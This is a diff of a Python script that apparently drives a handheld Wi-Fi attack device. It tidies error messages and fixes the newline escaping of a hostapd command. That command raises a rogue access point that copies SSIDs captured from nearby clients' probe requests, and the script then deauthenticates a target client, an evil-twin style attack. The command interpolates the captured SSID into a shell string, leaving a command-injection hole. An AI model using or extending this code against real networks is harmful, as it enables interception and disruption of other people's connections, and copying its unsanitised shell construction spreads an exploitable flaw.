@@ -77,7 +77,7 @@ def cleanup(*_):
     global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE
     running = False
     for proc in attack_procs.values():
-        try: os.kill(proc.pid, signal.SIGTERM)
+        try: os.kill(proc.pid, signal.SIGTERM) 
         except: pass
     
     if WIFI_INTERFACE: # Check if monitor mode was ever activated
@@ -177,8 +177,9 @@ def select_interface_menu():
                 time.sleep(2)
                 return True
             else:
-                draw_message(["ERROR:", "Failed to activate", "monitor mode!"], "red")
-                print(f"ERROR: _activate_monitor_mode failed for {selected_iface}", file=sys.stderr)
+                # Display a more informative error if activation fails
+                draw_message(["ERROR:", "Monitor mode failed!", "Check stderr for details."], "red")
+                print(f"ERROR: monitor_mode_helper.activate_monitor_mode failed for {selected_iface}. See stderr for details from helper.", file=sys.stderr)
                 time.sleep(3)
                 return False
         elif GPIO.input(PINS["KEY3"]) == 0 and (current_time - last_button_press_time > BUTTON_DEBOUNCE_TIME):
@@ -277,7 +278,7 @@ def run_attack():
         status_msg = "No probes found."
         return
 
-    rogue_ap_cmd = f"hostapd -C 'interface={WIFI_INTERFACE}\\ndriver=nl80211\\nssid={probed_ssid}\\nhw_mode=g\\nchannel=6\\n'"
+    rogue_ap_cmd = f"hostapd -C 'interface={WIFI_INTERFACE}\ndriver=nl80211\nssid={probed_ssid}\nhw_mode=g\nchannel=6\n'"
     attack_procs['hostapd'] = subprocess.Popen(rogue_ap_cmd, shell=True)
     
     status_msg = f"Deauthing {TARGET_CLIENT_MAC}"
